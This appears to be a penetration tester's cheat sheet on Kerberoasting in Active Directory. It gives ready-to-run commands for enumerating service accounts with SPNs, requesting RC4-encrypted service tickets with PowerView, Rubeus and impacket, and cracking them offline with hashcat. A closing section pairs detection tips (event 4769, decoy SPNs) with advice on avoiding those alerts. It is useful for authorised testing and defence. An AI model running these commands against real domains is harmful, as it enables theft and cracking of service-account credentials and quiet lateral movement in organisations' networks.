# Kerberoasting

- Kerberoasting is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service. 


## Requirements

To perform a Kerberoasting attack, you need one of the following:
- Cleartext password or NTLM hash of an account.
- A shell in the context of a domain user account.
- SYSTEM-level access on a domain-joined host.

> During a penetration test, if an SPN is found tied to a user account and cracking was unsuccessful, it should be marked as a `low` severity finding and just noted that this allows attackers to perform offline password cracking attacks against this account.


## How It Works

- Services in Active Directory run under the context of service accounts, which often have elevated privileges.
- Any authenticated user can request a Kerberos ticket for these service accounts.
- The ticket (TGS-REP) is encrypted using the service account's NTLM hash. This allows attackers to perform a brute-force attack on the ticket to recover the cleartext password.


## General Details

- Most services are executed by machine accounts (COMPUTERNAME$), which have 120 characters long randomly generated passwords, making it impractical to brute force.
- Sometimes services are executed by user accounts. These are the services we are interested in. A user account has a password set by a human, which is much more likely to be predictable. 
- When SPN accounts are set to use the `RC4` encryption algorithm, the tickets can be much easier to crack offline. 
- Mature organizations employ only `AES` (Advanced Encryption Standard), which can be much more challenging to crack, even on a robust password-cracking rig.


## Enumeration

- An account that exposes a service has a Service Principal Name (or SPN). 
- It is an LDAP attribute set on the account indicating the list of existing services provided by this account. 
- If this attribute is not empty, this account offers at least one service.

```shell
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

- This powershell script can be used to enumerate the accounts with SPNs:

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```

> We can also use the Setspn built-in Windows binary to search for SPN accounts.

- Enumerating using PowerView:

```powershell
# Import PowerView module
Import-Module .\PowerView.ps1

# Retreive accounts with SPNs
Get-DomainUser -SPN
Get-DomainUser * -spn | Select-Object samaccountname
```
- Enumerating using ADsearch

```powershell
.\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```

## Hashing Algorithm

- Kerberoasting tools typically request `RC4 encryption` because it is weaker and faster to crack.
- RC4 hashes begin with `$krb5tgs$23$*`.
- AES-256 encrypted hashes start with `$krb5tgs$18$*` and take longer to crack.

```shell
# Check encryption type for a user
Get-DomainUser <username> -Properties samaccountname, \
serviceprincipalname, msds-supportedencryptiontypes
```

- If `msds-supportedencryptiontypes` is set to 0, RC4 encryption is used. If set to
 24, only AES 128/256 encryption types are supported.

### Notes

- **Windows Server 2019:** Always provides tickets encrypted with the highest supported
 encryption level of the target account.
- **Windows Server 2016 or Earlier:** Attackers can request RC4 encrypted tickets even 
if AES is enabled.


## Attacking from Windows

- Using PowerView:

```shell
# Import PowerView module
Import-Module .\PowerView.ps1

# Request ticket for a user
Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat

# Get tickets for all users and export to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | \
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

- Using Invoke-Kerberoast

```powershell
Import-Module .\PowerView.ps1
Invoke-Kerberoast
```

- Using Rubeus:

> We could use the `/pwdsetafter` and `/pwdsetbefore` arguments to Kerberoast accounts whose password was set within a particular date. This can be helpful to us, as sometimes we find legacy accounts with a password set many years ago that is outside of the current password policy and relatively easy to crack.

```shell
# Retrieve stats
Rubeus.exe kerberoast /stats

# Request ticket for a user with forcing RC4 encrypted ticket
Rubeus.exe kerberoast /tgtdeleg /user:<username> /nowrap /outfile:hash.txt

# Perform kerberoasting
Rubeus.exe kerberoast /nowrap /outfile:hash.txt
```

## Kerberoasting without an Account Password

- This can be possible when we know of an account without Kerberos pre-authentication enabled.
- We can use this account to use an AS-REQ request (usually used to request a TGT) to request a TGS ticket for a Kerberoastable user.
- This is done by modifying the req-body portion of the request. [Reference](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

- To perform this attack, we need the following:
    - Username of an account with pre-authentication disabled (DONT_REQ_PREAUTH).
    - A target SPN or a list of SPNs.

```powershell
.\Rubeus.exe kerberoast /nopreauth:<asreproastable user> /domain: /spn: /nowrap
```
> Instead of /spn we can use /spns:listofspn.txt to try multiple SPNs.


## Attacking from Linux

> From a Domain-Joined Linux Host, execute commands as root after retrieving the keytab file.

```shell
# Retrieve SPNs
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username>
# Request tickets and save to file
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username> -request -outputfile tgs
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username> -request-user target_user
# Crack tickets using hashcat
hashcat -m 13100 <ticket_file> <wordlist_path>   # RC4 encryption
hashcat -m 19700 <ticket_file> <wordlist_path>   # AES encryption
```


## OPSEC Considerations

- Each TGS-REP generates a `4769` event, so a single user requesting multiple tickets in a short timeframe should be investigated.
- As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.
- Another effective strategy is to create one or more `dummy SPNs` that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them. Since most tools automatically enumerate and roast every account in a domain with an SPN set, a careless adversary can trigger this high-fidelity alert.
- A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.